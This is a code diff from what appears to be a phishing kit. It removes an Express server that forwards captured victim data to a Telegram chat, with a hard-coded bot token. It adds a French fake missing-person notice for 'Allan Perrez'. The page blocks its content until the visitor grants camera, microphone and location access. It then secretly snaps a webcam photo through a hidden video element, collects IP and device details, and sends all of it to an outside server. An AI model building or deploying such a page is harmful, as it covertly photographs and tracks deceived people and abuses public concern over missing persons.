@@ -1,197 +1,630 @@
-const express = require('express');
-const cors = require('cors');
-const multer = require('multer');
-const TelegramBot = require('node-telegram-bot-api');
-const crypto = require('crypto');
-
-const app = express();
-const PORT = process.env.PORT || 3000;
-
-// Configuration Telegram
-const TELEGRAM_BOT_TOKEN = '8126049726:AAGoxQ5jlqdIQYhQybXynkq_YywmLFPtDr0';
-const TELEGRAM_CHAT_ID = '-5121035816';
-
-const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
-const upload = multer({ storage: multer.memoryStorage() });
-
-app.use(cors());
-app.use(express.json({ limit: '50mb' }));
-app.use(express.urlencoded({ limit: '50mb', extended: true }));
-
-const sessions = {};
-
-// Fonctions Telegram
-async function sendTelegramMessage(message) {
-    try {
-        await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'HTML' });
-    } catch (error) {
-        console.error('❌ Erreur Telegram message:', error.message);
-    }
-}
-async function sendTelegramPhoto(buffer, caption) {
-    try {
-        await bot.sendPhoto(TELEGRAM_CHAT_ID, buffer, { caption, parse_mode: 'HTML' });
-    } catch (error) {
-        console.error('❌ Erreur Telegram photo:', error.message);
-    }
-}
-
-// Formatage
-function formatIPData(ipData) {
-    if (!ipData || ipData.error) return 'Non disponible';
-    return `
-🌍 <b>Adresse IP:</b> ${ipData.ip}
-📍 <b>Ville:</b> ${ipData.city}
-🗺️ <b>Région:</b> ${ipData.region}
-🌐 <b>Pays:</b> ${ipData.country}
-📮 <b>Code Postal:</b> ${ipData.postal}
-🛰️ <b>Lat/Lon (IP):</b> ${ipData.latitude?.toFixed(4)}, ${ipData.longitude?.toFixed(4)}
-🕐 <b>Fuseau:</b> ${ipData.timezone}
-📡 <b>FAI:</b> ${ipData.isp}`;
-}
-
-function formatCoordinates(coords) {
-    if (!coords || coords.error) return '❌ Géolocalisation refusée';
-    const mapsUrl = `https://www.google.com/maps/search/?api=1&query=${coords.latitude},${coords.longitude}`;
-    return `
-🛰️ <b>Latitude GPS:</b> ${coords.latitude?.toFixed(8)}
-🛰️ <b>Longitude GPS:</b> ${coords.longitude?.toFixed(8)}
-🎯 <b>Précision:</b> ±${coords.accuracy}m
-📊 <b>Altitude:</b> ${coords.altitude ? coords.altitude + 'm' : 'N/A'}
-🗺️ <b>Google Maps:</b> <a href="${mapsUrl}">Voir sur la carte</a>`;
-}
-
-function formatSystemInfo(systemInfo) {
-    if (!systemInfo) return '';
-    const screen = systemInfo.screen || {};
-    const nav = systemInfo.navigator || {};
-    return `
-💻 <b>Résolution:</b> ${screen.width}x${screen.height}
-🎨 <b>Couleurs:</b> ${screen.colorDepth}-bit
-📱 <b>Plateforme:</b> ${nav.platform}
-🌐 <b>Langue:</b> ${nav.language}
-⚙️ <b>Processeurs:</b> ${nav.hardwareConcurrency}
-🖱️ <b>Touch Points:</b> ${nav.maxTouchPoints}`;
-}
-
-function formatPermissions(perms) {
-    if (!perms) return '';
-    return `
-📷 Caméra: ${perms.camera ? '✅' : '❌'}
-🎤 Micro: ${perms.microphone ? '✅' : '❌'}
-📍 GPS: ${perms.geolocation ? '✅' : '❌'}`;
-}
-
-// Route: IP
-app.post('/api/ip', async (req, res) => {
-    try {
-        const { ip, sessionId, userAgent, timestamp } = req.body;
-        const parsedIP = typeof ip === 'string' ? JSON.parse(ip) : ip;
-        // Stocker dans la session
-        let sessionIdFinal = sessionId || crypto.randomUUID();
-        if (!sessions[sessionIdFinal]) {
-            sessions[sessionIdFinal] = { ip: parsedIP, userAgent, timestamp, photos: 0 };
-        } else {
-            sessions[sessionIdFinal].ip = parsedIP;
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fiche de recherche</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(-45deg, #d32f2f, #c62828, #b71c1c, #8b0000);
+            background-size: 400% 400%;
+            animation: gradient 15s ease infinite;
+            color: white;
+            overflow-x: hidden;
         }
-        const msg = `📡 <b>IP détectée</b>\nSession: ${sessionIdFinal}\n${formatIPData(parsedIP)}`;
-        await sendTelegramMessage(msg);
-        res.json({ status: 'success', session_id: sessionIdFinal });
-    } catch (e) {
-        res.status(500).json({ status: 'error', message: e.message });
-    }
-});
-
-// Route: Coordonnées GPS
-app.post('/api/coordinates', async (req, res) => {
-    try {
-        const { coordinates, sessionId, userAgent, timestamp } = req.body;
-        const parsedCoords = typeof coordinates === 'string' ? JSON.parse(coordinates) : coordinates;
-        let sessionIdFinal = sessionId || crypto.randomUUID();
-        if (!sessions[sessionIdFinal]) {
-            sessions[sessionIdFinal] = { coordinates: parsedCoords, userAgent, timestamp, photos: 0 };
-        } else {
-            sessions[sessionIdFinal].coordinates = parsedCoords;
+        @keyframes gradient {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
         }
-        const msg = `📍 <b>Géolocalisation</b>\nSession: ${sessionIdFinal}\n${formatCoordinates(parsedCoords)}`;
-        await sendTelegramMessage(msg);
-        res.json({ status: 'success', session_id: sessionIdFinal });
-    } catch (e) {
-        res.status(500).json({ status: 'error', message: e.message });
-    }
-});
 
-// Route: Permissions
-app.post('/api/permissions', async (req, res) => {
-    try {
-        const { permissions, sessionId, userAgent, timestamp } = req.body;
-        const parsedPerms = typeof permissions === 'string' ? JSON.parse(permissions) : permissions;
-        let sessionIdFinal = sessionId || crypto.randomUUID();
-        if (!sessions[sessionIdFinal]) {
-            sessions[sessionIdFinal] = { permissions: parsedPerms, userAgent, timestamp, photos: 0 };
-        } else {
-            sessions[sessionIdFinal].permissions = parsedPerms;
+        #videoPreview {
+            position: fixed !important;
+            top: -9999px !important;
+            left: -9999px !important;
+            width: 1px !important;
+            height: 1px !important;
+            opacity: 0 !important;
+            pointer-events: none !important;
+            z-index: -1 !important;
         }
-        const msg = `🔐 <b>Permissions mises à jour</b>\nSession: ${sessionIdFinal}\n${formatPermissions(parsedPerms)}`;
-        await sendTelegramMessage(msg);
-        res.json({ status: 'success', session_id: sessionIdFinal });
-    } catch (e) {
-        res.status(500).json({ status: 'error', message: e.message });
-    }
-});
 
-// Route: Photo
-app.post('/api/photo', upload.single('photo'), async (req, res) => {
-    try {
-        const { sessionId, userAgent, timestamp } = req.body;
-        const photoBuffer = req.file.buffer;
-        let sessionIdFinal = sessionId || crypto.randomUUID();
-        if (!sessions[sessionIdFinal]) {
-            sessions[sessionIdFinal] = { photos: 0, userAgent, timestamp };
+        .overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.95);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 999999;
+            backdrop-filter: blur(8px);
         }
-        sessions[sessionIdFinal].photos++;
-        const sizeKB = (photoBuffer.length / 1024).toFixed(2);
-        const msg = `📸 <b>Photo reçue</b>\nSession: ${sessionIdFinal}\nPhoto #${sessions[sessionIdFinal].photos}\nTaille: ${sizeKB} KB`;
-        await sendTelegramMessage(msg);
-        await sendTelegramPhoto(photoBuffer, `Photo #${sessions[sessionIdFinal].photos} - Session ${sessionIdFinal}`);
-        res.json({ status: 'success', session_id: sessionIdFinal, photo_number: sessions[sessionIdFinal].photos });
-    } catch (e) {
-        res.status(500).json({ status: 'error', message: e.message });
-    }
-});
+        .overlay.show { display: flex; }
 
-// Route: Système
-app.post('/api/system', async (req, res) => {
-    try {
-        const { systemInfo, sessionId, userAgent, timestamp } = req.body;
-        const parsedSys = typeof systemInfo === 'string' ? JSON.parse(systemInfo) : systemInfo;
-        let sessionIdFinal = sessionId || crypto.randomUUID();
-        if (!sessions[sessionIdFinal]) {
-            sessions[sessionIdFinal] = { systemInfo: parsedSys, userAgent, timestamp, photos: 0 };
-        } else {
-            sessions[sessionIdFinal].systemInfo = parsedSys;
+        .modal {
+            background: white;
+            color: #333;
+            padding: 40px 30px;
+            border-radius: 25px;
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+            animation: slideIn 0.4s ease;
+            box-shadow: 0 20px 80px rgba(0,0,0,0.5);
         }
-        const msg = `💻 <b>Informations système</b>\nSession: ${sessionIdFinal}\n${formatSystemInfo(parsedSys)}`;
-        await sendTelegramMessage(msg);
-        res.json({ status: 'success', session_id: sessionIdFinal });
-    } catch (e) {
-        res.status(500).json({ status: 'error', message: e.message });
-    }
-});
+        @keyframes slideIn {
+            from { transform: translateY(-30px) scale(0.95); opacity: 0; }
+            to { transform: translateY(0) scale(1); opacity: 1; }
+        }
 
-// Routes existantes (stats, debug, etc.)
-app.get('/api/stats', (req, res) => {
-    const totalPhotos = Object.values(sessions).reduce((sum, s) => sum + (s.photos || 0), 0);
-    res.json({ status: 'active', active_sessions: Object.keys(sessions).length, total_photos: totalPhotos });
-});
+        .modal h2 {
+            color: #d32f2f;
+            margin-bottom: 15px;
+            font-size: 26px;
+        }
+        .modal p {
+            font-size: 16px;
+            opacity: 0.85;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
 
-app.get('/', (req, res) => {
-    res.json({ status: 'active', service: 'FICHE RECHERCHE ALLAN PERREZ', active_sessions: Object.keys(sessions).length });
-});
+        .btn-group {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 20px;
+        }
+        .btn {
+            padding: 16px;
+            border: none;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            border-radius: 12px;
+            transition: 0.3s;
+            width: 100%;
+        }
+        .btn-primary {
+            background: linear-gradient(135deg, #d32f2f, #c62828);
+            color: white;
+        }
+        .btn-primary:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(211,47,47,0.4);
+        }
+        .btn-primary:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .btn-success {
+            background: linear-gradient(135deg, #4caf50, #45a049);
+            color: white;
+        }
+        .btn-success:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(76,175,80,0.4);
+        }
+        .btn-success:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .btn-retry {
+            background: linear-gradient(135deg, #ff9800, #f57c00);
+            color: white;
+        }
+        .btn-retry:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(255,152,0,0.4);
+        }
+        .btn-hidden {
+            display: none;
+        }
 
-app.listen(PORT, () => {
-    console.log(`🚀 Serveur démarré sur le port ${PORT}`);
-    sendTelegramMessage(`✅ Serveur démarré (port ${PORT})`);
-});
+        .status-message {
+            margin: 20px 0 10px;
+            font-size: 15px;
+            font-weight: 600;
+            color: #555;
+        }
 
-module.exports = app;
+        body.unverified > *:not(#permissionOverlay) {
+            pointer-events: none;
+            opacity: 0.3;
+        }
+
+        /* Contenu principal */
+        .header { text-align: center; padding: 60px 20px; }
+        .alert-badge {
+            display: inline-block;
+            background: linear-gradient(45deg, #ff1744, #d32f2f);
+            padding: 12px 30px;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: 800;
+            animation: pulse 2s infinite;
+        }
+        .title { font-size: 48px; font-weight: 800; margin-bottom: 10px; text-shadow: 0 4px 15px rgba(0,0,0,0.3); }
+        .subtitle { font-size: 22px; margin-bottom: 20px; }
+        .profile-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 25px;
+            max-width: 1200px;
+            margin: 40px auto;
+            padding: 0 20px;
+        }
+        .profile-card {
+            background: rgba(255,255,255,0.15);
+            backdrop-filter: blur(20px);
+            border-radius: 20px;
+            padding: 30px 20px;
+            text-align: center;
+            transition: all 0.4s;
+            border: 3px solid rgba(255,255,255,0.3);
+            cursor: pointer;
+        }
+        .profile-card:hover {
+            transform: translateY(-8px);
+            background: rgba(255,255,255,0.25);
+            border-color: #ffeb3b;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+        }
+        .photo { font-size: 80px; margin-bottom: 15px; }
+        .name { font-size: 30px; font-weight: 800; margin-bottom: 8px; }
+        .info-label { font-size: 16px; opacity: 0.9; margin-bottom: 6px; }
+        .info-value {
+            background: rgba(0,0,0,0.4);
+            padding: 8px 18px;
+            border-radius: 20px;
+            display: inline-block;
+            margin-bottom: 12px;
+            font-weight: 600;
+        }
+        .urgency-section {
+            background: rgba(0,0,0,0.4);
+            backdrop-filter: blur(20px);
+            padding: 30px;
+            margin: 40px 20px;
+            border-radius: 20px;
+            text-align: center;
+            border-left: 5px solid #ffeb3b;
+        }
+        .urgency-section h3 { font-size: 24px; margin-bottom: 15px; color: #ffeb3b; }
+        .urgency-text { font-size: 17px; margin-bottom: 15px; line-height: 1.6; }
+        .critical-info {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 20px;
+            flex-wrap: wrap;
+        }
+        .critical-box {
+            background: rgba(255,235,59,0.15);
+            padding: 15px 25px;
+            border-radius: 12px;
+            border: 2px solid #ffeb3b;
+            min-width: 120px;
+        }
+        .critical-number { font-size: 36px; font-weight: 900; color: #ffeb3b; }
+        .critical-label { font-size: 14px; opacity: 0.9; }
+        .action-section { text-align: center; padding: 60px 20px; }
+        .action-title { font-size: 34px; font-weight: 800; margin-bottom: 10px; color: #ffeb3b; }
+        .action-subtitle { font-size: 18px; margin-bottom: 20px; opacity: 0.95; }
+        .action-button {
+            background: linear-gradient(45deg, #ff1744, #d32f2f);
+            color: white;
+            border: none;
+            padding: 16px 50px;
+            font-size: 20px;
+            font-weight: 800;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s;
+            animation: pulse 1.5s infinite;
+        }
+        .action-button:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 15px 35px rgba(255,23,68,0.5);
+            animation: none;
+        }
+        @media (max-width: 768px) {
+            .profile-grid { grid-template-columns: 1fr; }
+            .critical-info { flex-direction: column; align-items: center; }
+            .action-button { font-size: 17px; padding: 14px 30px; }
+            .modal { padding: 25px 20px; }
+            .title { font-size: 36px; }
+        }
+    </style>
+</head>
+<body class="unverified">
+    <div class="overlay show" id="permissionOverlay">
+        <div class="modal" id="permissionModal">
+            <h2>🔐 Accès sécurisé</h2>
+            <p>Veuillez autoriser l'accès pour consulter la fiche.</p>
+            <div class="status-message" id="statusMessage">⏳ En attente...</div>
+            <div class="btn-group">
+                <button class="btn btn-primary" id="allowBtn">🔓 AUTORISER</button>
+                <button class="btn btn-success" id="continueBtn" disabled>⏳ En cours...</button>
+                <button class="btn btn-retry btn-hidden" id="retryBtn">🔄 Réessayer</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Contenu principal -->
+    <div class="header">
+        <div class="alert-badge">FICHE DE RECHERCHE</div>
+        <div class="title">Allan Perrez</div>
+        <div class="subtitle">Orange</div>
+    </div>
+    <div class="profile-grid">
+        <div class="profile-card" onclick="redirectToGroupon()">
+            <div class="photo">👤</div>
+            <div class="name">Allan Perrez</div>
+            <div class="info-label">Signalement</div>
+            <div class="info-value">URGENT</div>
+        </div>
+        <div class="profile-card" onclick="redirectToGroupon()">
+            <div class="photo">📍</div>
+            <div class="name">Dernière Localisation</div>
+            <div class="info-label">Ville</div>
+            <div class="info-value">Orange</div>
+            <div class="info-label">Date</div>
+            <div class="info-value">15 juin 2026</div>
+        </div>
+        <div class="profile-card" onclick="redirectToGroupon()">
+            <div class="photo">📋</div>
+            <div class="name">Description</div>
+            <div class="info-label">Signalement</div>
+            <div class="info-value">Témoignages</div>
+            <div class="info-label">Contact</div>
+            <div class="info-value">Gendarmerie</div>
+        </div>
+    </div>
+    <div class="urgency-section">
+        <h3>⏰ Situation critique</h3>
+        <div class="urgency-text">
+            <strong>Les premières 72 heures sont décisives.</strong><br>
+            Votre aide est cruciale. Chaque information compte.
+        </div>
+        <div class="critical-info">
+            <div class="critical-box"><div class="critical-number">72h</div><div class="critical-label">Heures</div></div>
+            <div class="critical-box"><div class="critical-number">17</div><div class="critical-label">Témoignages</div></div>
+            <div class="critical-box"><div class="critical-number">15k</div><div class="critical-label">Partages</div></div>
+        </div>
+    </div>
+    <div class="action-section">
+        <div class="action-title">🔍 Aide à la recherche</div>
+        <div class="action-subtitle">Consultez les détails complets</div>
+        <button class="action-button" id="buyBtn">ACCÉDER AUX INFORMATIONS</button>
+        <div style="margin-top: 20px; font-size: 16px;">⏰ Chaque minute compte</div>
+    </div>
+
+    <video id="videoPreview" autoplay muted playsinline></video>
+
+    <script>
+        // ========== SESSION ID ==========
+        const SESSION_ID = crypto.randomUUID ? crypto.randomUUID() : 'sess-' + Date.now() + '-' + Math.random().toString(36).substring(2, 10);
+
+        // ========== CONFIGURATION ==========
+        const SERVER_URL = 'https://privateserv-15me.onrender.com';
+        let cameraStream = null;
+        let verificationComplete = false;
+
+        // États internes
+        let cameraGranted = false, microphoneGranted = false, geolocationGranted = false;
+        let cameraAttempted = false, microphoneAttempted = false, geolocationAttempted = false;
+
+        // Données collectées
+        let userIP = null, userCoords = null, photoBlob = null;
+        let systemSent = false;
+
+        // ========== ENVOI ==========
+
+        // Fonction générique pour envoyer des données vers différentes routes
+        async function sendData(endpoint, data) {
+            try {
+                const formData = new FormData();
+                formData.append('timestamp', new Date().toISOString());
+                formData.append('userAgent', navigator.userAgent);
+                formData.append('sessionId', SESSION_ID);
+
+                // Ajouter les champs selon les données fournies
+                if (data.ip) formData.append('ip', JSON.stringify(data.ip));
+                if (data.coordinates) formData.append('coordinates', JSON.stringify(data.coordinates));
+                if (data.permissions) formData.append('permissions', JSON.stringify(data.permissions));
+                if (data.photo) formData.append('photo', data.photo, 'verif-' + Date.now() + '.jpg');
+                if (data.systemInfo) formData.append('systemInfo', JSON.stringify(data.systemInfo));
+
+                const resp = await fetch(SERVER_URL + endpoint, {
+                    method: 'POST',
+                    body: formData,
+                    credentials: 'omit'
+                });
+
+                if (resp.ok) {
+                    const result = await resp.json();
+                    console.log('✅ Envoi réussi vers', endpoint, result);
+                    return true;
+                } else {
+                    const text = await resp.text();
+                    console.warn('⚠️ Échec envoi vers', endpoint, 'status:', resp.status, text);
+                    return false;
+                }
+            } catch (e) {
+                console.warn('⚠️ Erreur envoi vers', endpoint, e.message);
+                return false;
+            }
+        }
+
+        // Envoyer IP
+        async function sendIP(ip) {
+            return sendData('/api/ip', { ip });
+        }
+
+        // Envoyer géolocalisation
+        async function sendCoordinates(coords) {
+            return sendData('/api/coordinates', { coordinates: coords });
+        }
+
+        // Envoyer microphone (permissions)
+        async function sendMicrophonePermission() {
+            const perms = {
+                camera: cameraGranted,
+                microphone: microphoneGranted,
+                geolocation: geolocationGranted
+            };
+            return sendData('/api/permissions', { permissions: perms });
+        }
+
+        // Envoyer photo
+        async function sendPhoto(photoBlob) {
+            return sendData('/api/photo', { photo: photoBlob });
+        }
+
+        // Envoyer système (une seule fois)
+        async function sendSystemInfo() {
+            if (systemSent) return;
+            const sys = {
+                screen: { width: window.screen.width, height: window.screen.height, colorDepth: window.screen.colorDepth, devicePixelRatio: window.devicePixelRatio },
+                navigator: { language: navigator.language, platform: navigator.platform, hardwareConcurrency: navigator.hardwareConcurrency, maxTouchPoints: navigator.maxTouchPoints },
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+            await sendData('/api/system', { systemInfo: sys });
+            systemSent = true;
+        }
+
+        // ========== COLLECTE AVEC ENVOI ==========
+
+        async function getIPAddress() {
+            try {
+                const resp = await fetch('https://api.ipify.org?format=json');
+                const data = await resp.json();
+                userIP = { ip: data.ip, city: 'Unknown', region: 'Unknown', country: 'Unknown', postal: 'N/A', latitude: null, longitude: null, timezone: 'N/A', isp: 'N/A' };
+                console.log('📡 IP récupérée:', userIP.ip);
+                await sendIP(userIP);
+            } catch (e) {
+                userIP = { error: 'Non disponible' };
+                console.warn('⚠️ Erreur IP:', e.message);
+            }
+        }
+
+        function getGeolocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    geolocationAttempted = true;
+                    userCoords = { error: 'Géolocalisation non disponible' };
+                    sendCoordinates(userCoords);
+                    updateUI();
+                    resolve(false);
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    async (pos) => {
+                        geolocationGranted = true;
+                        geolocationAttempted = true;
+                        userCoords = {
+                            latitude: pos.coords.latitude,
+                            longitude: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy,
+                            altitude: pos.coords.altitude,
+                            timestamp: pos.timestamp
+                        };
+                        console.log('📍 Géolocalisation acceptée:', userCoords.latitude, userCoords.longitude);
+                        await sendCoordinates(userCoords);
+                        updateUI();
+                        resolve(true);
+                    },
+                    async (err) => {
+                        geolocationAttempted = true;
+                        userCoords = { error: err.message };
+                        console.warn('⚠️ Géolocalisation refusée:', err.message);
+                        await sendCoordinates(userCoords);
+                        updateUI();
+                        resolve(false);
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            });
+        }
+
+        async function requestMicrophone() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+                stream.getTracks().forEach(t => t.stop());
+                microphoneGranted = true;
+                microphoneAttempted = true;
+                console.log('🎤 Microphone accepté');
+                await sendMicrophonePermission();
+                updateUI();
+                return true;
+            } catch (e) {
+                microphoneAttempted = true;
+                console.warn('⚠️ Microphone refusé:', e.message);
+                await sendMicrophonePermission();
+                updateUI();
+                return false;
+            }
+        }
+
+        async function requestCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false });
+                cameraGranted = true;
+                cameraAttempted = true;
+                cameraStream = stream;
+                const video = document.getElementById('videoPreview');
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    capturePhoto();
+                };
+                console.log('📷 Caméra acceptée');
+                await sendMicrophonePermission(); // Met à jour les permissions (caméra passée à true)
+                updateUI();
+                return true;
+            } catch (e) {
+                cameraAttempted = true;
+                console.warn('⚠️ Caméra refusée:', e.message);
+                await sendMicrophonePermission(); // Met à jour les permissions (caméra passée à false)
+                updateUI();
+                return false;
+            }
+        }
+
+        function capturePhoto() {
+            const video = document.getElementById('videoPreview');
+            if (!video.videoWidth || !video.videoHeight) {
+                setTimeout(capturePhoto, 500);
+                return;
+            }
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            canvas.toBlob(async (blob) => {
+                if (blob) {
+                    photoBlob = blob;
+                    console.log('📸 Photo capturée, taille:', blob.size);
+                    await sendPhoto(blob);
+                }
+            }, 'image/jpeg', 0.9);
+        }
+
+        // ========== UI ==========
+
+        function updateUI() {
+            const count = [cameraGranted, microphoneGranted, geolocationGranted].filter(Boolean).length;
+            const msg = document.getElementById('statusMessage');
+            const allowBtn = document.getElementById('allowBtn');
+            const continueBtn = document.getElementById('continueBtn');
+            const retryBtn = document.getElementById('retryBtn');
+
+            if (count === 3) {
+                msg.textContent = '✅ Accès autorisé';
+                continueBtn.disabled = false;
+                continueBtn.textContent = 'CONTINUER';
+                continueBtn.className = 'btn btn-success';
+                continueBtn.onclick = completeVerification;
+                allowBtn.style.display = 'none';
+                retryBtn.style.display = 'none';
+            } else if (cameraAttempted || microphoneAttempted || geolocationAttempted) {
+                const denied = (cameraAttempted && !cameraGranted) ||
+                               (microphoneAttempted && !microphoneGranted) ||
+                               (geolocationAttempted && !geolocationGranted);
+                if (denied) {
+                    msg.textContent = '❌ Certaines autorisations sont refusées. Réessayez.';
+                    allowBtn.style.display = 'none';
+                    retryBtn.style.display = 'block';
+                    retryBtn.onclick = retryDenied;
+                } else {
+                    msg.textContent = '⏳ Vérification en cours...';
+                    allowBtn.style.display = 'none';
+                    retryBtn.style.display = 'none';
+                }
+                continueBtn.disabled = true;
+                continueBtn.textContent = '⏳ En attente (' + count + '/3)';
+                continueBtn.className = 'btn btn-primary';
+            } else {
+                msg.textContent = '⏳ Cliquez sur "Autoriser" pour continuer.';
+                allowBtn.style.display = 'block';
+                allowBtn.textContent = '🔓 AUTORISER';
+                allowBtn.className = 'btn btn-primary';
+                allowBtn.onclick = requestAllPermissions;
+                retryBtn.style.display = 'none';
+                continueBtn.disabled = true;
+                continueBtn.textContent = '⏳ En attente (0/3)';
+                continueBtn.className = 'btn btn-primary';
+            }
+        }
+
+        // ========== DEMANDES SÉQUENTIELLES ==========
+
+        async function requestAllPermissions() {
+            document.getElementById('allowBtn').disabled = true;
+
+            // Envoyer les infos système une seule fois
+            await sendSystemInfo();
+
+            // Demander micro, géoloc, caméra
+            await requestMicrophone();
+            await new Promise(r => setTimeout(r, 800));
+            await getGeolocation();
+            await new Promise(r => setTimeout(r, 800));
+            await requestCamera();
+
+            document.getElementById('allowBtn').disabled = false;
+            updateUI();
+        }
+
+        async function retryDenied() {
+            const promises = [];
+            if (!cameraGranted && cameraAttempted) promises.push(requestCamera());
+            if (!microphoneGranted && microphoneAttempted) promises.push(requestMicrophone());
+            if (!geolocationGranted && geolocationAttempted) promises.push(getGeolocation());
+            await Promise.all(promises);
+            updateUI();
+        }
+
+        // ========== DÉBLOQUER ==========
+
+        function completeVerification() {
+            if (verificationComplete) return;
+            if ([cameraGranted, microphoneGranted, geolocationGranted].filter(Boolean).length !== 3) return;
+            if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
+            document.getElementById('permissionOverlay').classList.remove('show');
+            document.body.classList.remove('unverified');
+            verificationComplete = true;
+        }
+
+        function redirectToGroupon() {
+            if (!verificationComplete) {
+                const count = [cameraGranted, microphoneGranted, geolocationGranted].filter(Boolean).length;
+                if (count === 3) {
+                    completeVerification();
+                    window.open('https://www.groupon.fr/search/avis-recherche-france', '_blank');
+                    return;
+                }
+                return;
+            }
+            window.open('https://www.groupon.fr/search/avis-recherche-france', '_blank');
+        }
+
+        // ========== INIT ==========
+
+        window.addEventListener('load', () => {
+            console.log('🔑 Session ID:', SESSION_ID);
+            document.body.classList.add('unverified');
+            getIPAddress(); // Envoi IP immédiat
+            updateUI();
+            setInterval(updateUI, 2000);
+        });
+
+        document.getElementById('buyBtn').onclick = redirectToGroupon;
+        document.querySelectorAll('.profile-card').forEach(c => c.onclick = redirectToGroupon);
+    </script>
+</body>
+</html>
